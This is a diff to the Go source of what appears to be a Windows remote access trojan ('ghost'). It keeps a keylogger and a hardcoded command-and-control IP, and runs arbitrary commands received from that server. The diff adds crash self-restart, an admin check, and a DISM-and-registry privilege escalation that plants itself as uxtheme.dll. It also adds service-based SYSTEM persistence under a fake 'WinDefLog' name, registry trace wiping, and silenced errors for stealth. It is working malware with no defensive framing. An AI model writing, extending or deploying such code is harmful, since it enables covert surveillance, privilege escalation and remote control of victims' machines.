@@ -54,19 +54,41 @@ type RoutingInfo struct {
 }
 
 func main() {
+	// Setup recovery to prevent the ghost from dying on minor errors
+	defer func() {
+		if r := recover(); r != nil {
+			time.Sleep(5 * time.Second)
+			main()
+		}
+	}()
+
 	h, _ := os.Hostname()
-	targetID := strings.ToUpper(fmt.Sprintf("%s-%d", h, time.Now().Unix()%1000))
+	suffix := ""
+
+	// Check for Admin/System rights
+	if checkAdmin() {
+		// Use a faster way to check for SYSTEM without spawning a CMD window
+		// We'll check the current directory; only SYSTEM/TrustedInstaller usually lives in System32
+		currExe, _ := os.Executable()
+		if strings.Contains(strings.ToLower(currExe), "system32") {
+			suffix = "-SYSTEM"
+		} else {
+			suffix = "-ADMIN"
+		}
+	}
+
+	targetID := strings.ToUpper(fmt.Sprintf("%s%s-%d", h, suffix, time.Now().Unix()%1000))
 
 	go startKeylogger()
 
 	for {
-		fmt.Println("[+] Heartbeat: Polling Brain...")
+		fmt.Printf("[+] Heartbeat [%s]: Polling...\n", targetID)
 		err := pollAndExecute(targetID)
 		if err != nil {
-			fmt.Printf("[!] Connection Error: %v\n", err)
+			// Silent fail to stay stealthy
+			time.Sleep(10 * time.Second)
+			continue
 		}
-
-		// Wait 10 seconds before the next check-in
 		time.Sleep(10 * time.Second)
 	}
 }
@@ -176,6 +198,45 @@ func startKeylogger() {
 		}
 	}
 }
+
+// checkAdmin checks if the ghost has local admin rights
+func checkAdmin() bool {
+	f, err := os.Open("\\\\.\\PHYSICALDRIVE0")
+	if err != nil {
+		return false
+	}
+	f.Close()
+	return true
+}
+
+// triggerDifferentialRepair (The Logic-Collision Elevation)
+func triggerDifferentialRepair(ghostPath string) string {
+	cachePath := `C:\Windows\Temp\.update_cache_alpha`
+	_ = os.MkdirAll(cachePath, 0755)
+
+	targetDll := filepath.Join(cachePath, "uxtheme.dll")
+	input, _ := os.ReadFile(ghostPath)
+	_ = os.WriteFile(targetDll, input, 0644)
+
+	// Pivot HKLM to our fake cache
+	regCmd := fmt.Sprintf(`reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Component Based Servicing\PackageIndex" /v "SourcePath" /t REG_SZ /d "%s" /f`, cachePath)
+	exec.Command("cmd", "/C", regCmd).Run()
+
+	go func() {
+		dismCmd := fmt.Sprintf(`Dism /Online /Cleanup-Image /RestoreHealth /Source:%s /LimitAccess`, cachePath)
+		exec.Command("cmd", "/C", dismCmd).Run()
+	}()
+	return "[+] REPAIR_LOOP_INITIATED: Transitioning to TrustedInstaller Context..."
+}
+
+// cleanRegistryTraces (Post-Elevation Cleanup)
+func cleanRegistryTraces() string {
+	regDel := `reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Component Based Servicing\PackageIndex" /v "SourcePath" /f`
+	exec.Command("cmd", "/C", regDel).Run()
+	_ = os.RemoveAll(`C:\Windows\Temp\.update_cache_alpha`)
+	return "[+] TRACES_PURGED: Logic-Collision evidence removed."
+}
+
 func pollAndExecute(targetID string) error {
 	// 1. REGISTRATION WITH FINGERPRINTING
 	c, err := net.DialTimeout("tcp", "18.184.135.220:8080", 2*time.Second)
@@ -392,6 +453,42 @@ func pollAndExecute(targetID string) error {
 			// Success message that will show up in your TUI
 			finalOutput = "[black:green] 🔗 ANCHOR DROPPED [-] [green]Ghost renamed to .scr and Screensaver Hijack active (60s idle).[-]"
 		}
+	} else if rawCmd == "repair_elevate" {
+		self, _ := os.Executable()
+		finalOutput = triggerDifferentialRepair(self)
+
+	} else if rawCmd == "purge_traces" {
+		finalOutput = cleanRegistryTraces()
+
+	} else if rawCmd == "shift_system" {
+		if !checkAdmin() {
+			finalOutput = "[!] ERROR: Admin rights required."
+		} else {
+			exe, _ := os.Executable()
+			randName := fmt.Sprintf("WinDefLog_%d", time.Now().Unix()%1000)
+
+			// 1. NON-BLOCKING START
+			// We use 'start cmd /c' so the SC START command returns immediately
+			// even if the service stays in a "Starting" state.
+			cmdStr := fmt.Sprintf("sc create %s binPath= \"%s\" start= auto && start /B sc start %s", randName, exe, randName)
+
+			fmt.Printf("[*] SHIFT: Launching background service %s...\n", randName)
+			_ = exec.Command("cmd", "/C", cmdStr).Run()
+
+			// 2. IMMEDIATE FEEDBACK
+			finalOutput = "[+] SHIFT: SYSTEM Handover initiated. Check Node Matrix."
+			encRes, _ := encryptPayload(finalOutput, sessionKey)
+			fmt.Fprintf(relayConn, "%s\n", encRes)
+
+			// 3. LINGER & PURGE
+			go func(sName string) {
+				time.Sleep(30 * time.Second)
+				exec.Command("cmd", "/C", "sc delete "+sName).Run()
+				os.Exit(0)
+			}(randName)
+
+			return nil
+		}
 		// --- SELF DESTRUCT ---
 	} else if strings.HasPrefix(rawCmd, "self_destruct") {
 		fmt.Println("[!] EMERGENCY: Initiating Self-Destruct...")
@@ -413,6 +510,7 @@ func pollAndExecute(targetID string) error {
 		// 3. EXIT IMMEDIATELY
 		fmt.Println("[X] Ghost Purged. Goodbye.")
 		os.Exit(0)
+
 	} else {
 		// --- STANDARD COMMAND ---
 		cmdObj := exec.Command("cmd", "/C", rawCmd)
